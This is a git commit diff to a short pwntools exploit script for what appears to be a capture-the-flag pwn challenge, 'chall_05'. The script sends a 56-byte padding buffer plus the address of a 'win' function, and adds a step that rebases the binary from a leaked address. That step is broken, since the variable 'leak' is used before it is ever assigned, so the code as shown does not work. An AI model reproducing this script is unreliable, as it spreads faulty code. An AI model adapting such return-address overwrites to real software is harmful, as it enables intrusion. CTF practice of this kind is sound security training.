0d98803da1074c6d63286f8e0e74b5dd2a4f3e5e
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-04 19:16:59 -0400

    Update 05.py

--- chall_05/05.py
+++ chall_05/05.py
@@ -1,14 +1,11 @@
 from pwn import *
-
-binary = context.binary = ELF('./chall_05')
-
 p = process("./chall_05")
+binary = context.binary = ELF('./chall_05')
 p.recv()
+leak = int(leak,16)
+binary.address = leak - binary.sym.main
+p.sendline(56*b'A' + p64(binary.sym.win) + b'')
 
 
-payload  = b''
-payload += 56 * b'A'
-payload += p64(binary.sym.win)
-
-p.sendline(payload)
-p.interactive()
+#To find the win address you need to use the leak address and go to the front of the ship (it was your analogy)
+#once you have the address you can move to the win address 
